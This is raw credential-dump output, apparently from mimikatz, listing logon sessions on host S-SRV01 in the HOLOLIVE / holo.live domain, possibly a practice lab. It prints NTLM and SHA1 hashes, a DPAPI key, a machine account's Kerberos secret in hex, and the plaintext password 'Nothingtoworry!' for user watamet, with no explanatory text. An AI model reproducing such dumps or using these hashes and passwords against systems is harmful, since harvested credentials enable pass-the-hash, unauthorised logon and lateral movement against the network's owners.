Logon Server      : (null)
Logon Time        : 2/2/2023 3:17:03 AM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : S-SRV01$
	 * Domain   : HOLOLIVE
	 * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
	 * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 343673 (00000000:00053e79)
Session           : Interactive from 1
User Name         : watamet
Domain            : HOLOLIVE
Logon Server      : DC-SRV01
Logon Time        : 2/2/2023 3:17:25 AM
SID               : S-1-5-21-471847105-3603022926-1728018720-1132
	msv :	
	 [00000003] Primary
	 * Username : watamet
	 * Domain   : HOLOLIVE
	 * NTLM     : d8d41e6cf762a8c77776a1843d4141c9
	 * SHA1     : 7701207008976fdd6c6be9991574e2480853312d
	 * DPAPI    : 300d9ad961f6f680c6904ac6d0f17fd0
	tspkg :	
	wdigest :	
	 * Username : watamet
	 * Domain   : HOLOLIVE
	 * Password : (null)
	kerberos :	
	 * Username : watamet
	 * Domain   : HOLO.LIVE
	 * Password : Nothingtoworry!
	ssp :	
	credman :	

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/2/2023 3:17:08 AM
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/2/2023 3:17:04 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 45756 (00000000:0000b2bc)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/2/2023 3:17:04 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : S-SRV01$
	 * Domain   : HOLOLIVE
	 * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
	 * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
	tspkg :	
	wdigest :	
	 * Username : S-SRV01$
	 * Domain   : HOLOLIVE
	 * Password : (null)
	kerberos :	
	 * Username : S-SRV01$
	 * Domain   : holo.live
	 * Password : 9e 8e d8 e0 37 37 04 5f 38 08 bd 3e aa b5 41 58 87 d0 db 00 dd ce 62 58 8f ee aa 5c b8 0d 05 c5 34 a5 70 80 2d 50 8f 25 68 a8 23 dd 04 ea aa 5c a5 25 63 93 1b 06 c6 e2 f2 3f 6a 49 d5 ad a2 16 e4 df df 5e 36 aa 5f 6a ab 56 d1 c5 3a df 85 7f 80 79 8d 61 d0 35 d2 56 0a e4 c1 51 df fc f3 ab f3 a2 83 81 01 d9 b2 79 89 c5 0d d5 c7 ad 52 fc d4 db 59 fa 04 95 22 3f 5d 21 f3 b4 10 0f ec 0b 04 c4 7b d9 f8 b6 08 de 83 de 7a 3f 37 48 40 e2 31 fe 85 9d 9c 4c 90 8c 41 55 29 14 0d 67 6a c1 68 66 ff cc f9 bc 19 56 a9 4a b9 60 c9 05 aa 0f 5b 96 d5 1f d2 1f 02 52 37 a2 8d 5c 1e da fb 2c 27 20 f3 6b 76 a1 66 b4 d3 d5 f2 28 11 08 26 83 4a d6 a6 3a 62 86 02 53 ee d9 a6 4e 44 6d 93 e4 ac 10 28 ee ae 4c b8 ba 52 09 e2 dc 7e 40 fd ef 
	ssp :	
	credman :	

Authentication Id : 0 ; 45732 (00000000:0000b2a4)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/2/2023 3:17:04 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : S-SRV01$
	 * Domain   : HOLOLIVE
	 * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
	 * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
	tspkg :	
	wdigest :	
	 * Username : S-SRV01$
	 * Domain   : HOLOLIVE
	 * Password : (null)
	kerberos :	
	 * Username : S-SRV01$
	 * Domain   : holo.live
	 * Password : 9e 8e d8 e0 37 37 04 5f 38 08 bd 3e aa b5 41 58 87 d0 db 00 dd ce 62 58 8f ee aa 5c b8 0d 05 c5 34 a5 70 80 2d 50 8f 25 68 a8 23 dd 04 ea aa 5c a5 25 63 93 1b 06 c6 e2 f2 3f 6a 49 d5 ad a2 16 e4 df df 5e 36 aa 5f 6a ab 56 d1 c5 3a df 85 7f 80 79 8d 61 d0 35 d2 56 0a e4 c1 51 df fc f3 ab f3 a2 83 81 01 d9 b2 79 89 c5 0d d5 c7 ad 52 fc d4 db 59 fa 04 95 22 3f 5d 21 f3 b4 10 0f ec 0b 04 c4 7b d9 f8 b6 08 de 83 de 7a 3f 37 48 40 e2 31 fe 85 9d 9c 4c 90 8c 41 55 29 14 0d 67 6a c1 68 66 ff cc f9 bc 19 56 a9 4a b9 60 c9 05 aa 0f 5b 96 d5 1f d2 1f 02 52 37 a2 8d 5c 1e da fb 2c 27 20 f3 6b 76 a1 66 b4 d3 d5 f2 28 11 08 26 83 4a d6 a6 3a 62 86 02 53 ee d9 a6 4e 44 6d 93 e4 ac 10 28 ee ae 4c b8 ba 52 09 e2 dc 7e 40 fd ef 
	ssp :	
	credman :	

Authentication Id : 0 ; 27350 (00000000:00006ad6)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/2/2023 3:17:03 AM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : S-SRV01$
	 * Domain   : HOLOLIVE
	 * NTLM     : 3179c8ec65934b8d33ac9ec2a9d93400
	 * SHA1     : fb4789d7ac8f1b2a46319fcb0ae10e616bd6a399
	tspkg :	
	wdigest :	
	 * Username : S-SRV01$
	 * Domain   : HOLOLIVE
	 * Password : (null)
	kerberos :	
	 * Username : S-SRV01$
	 * Domain   : holo.live
	 * Password : 9e 8e d8 e0 37 37 04 5f 38 08 bd 3e aa b5 41 58 87 d0 db 00 dd ce 62 58 8f ee aa 5c b8 0d 05 c5 34 a5 70 80 2d 50 8f 25 68 a8 23 dd 04 ea aa 5c a5 25 63 93 1b 06 c6 e2 f2 3f 6a 49 d5 ad a2 16 e4 df df 5e 36 aa 5f 6a ab 56 d1 c5 3a df 85 7f 80 79 8d 61 d0 35 d2 56 0a e4 c1 51 df fc f3 ab f3 a2 83 81 01 d9 b2 79 89 c5 0d d5 c7 ad 52 fc d4 db 59 fa 04 95 22 3f 5d 21 f3 b4 10 0f ec 0b 04 c4 7b d9 f8 b6 08 de 83 de 7a 3f 37 48 40 e2 31 fe 85 9d 9c 4c 90 8c 41 55 29 14 0d 67 6a c1 68 66 ff cc f9 bc 19 56 a9 4a b9 60 c9 05 aa 0f 5b 96 d5 1f d2 1f 02 52 37 a2 8d 5c 1e da fb 2c 27 20 f3 6b 76 a1 66 b4 d3 d5 f2 28 11 08 26 83 4a d6 a6 3a 62 86 02 53 ee d9 a6 4e 44 6d 93 e4 ac 10 28 ee ae 4c b8 ba 52 09 e2 dc 7e 40 fd ef 
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : S-SRV01$
Domain            : HOLOLIVE
Logon Server      : (null)
Logon Time        : 2/2/2023 3:17:03 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : S-SRV01$
	 * Domain   : HOLOLIVE
	 * Password : (null)
	kerberos :	
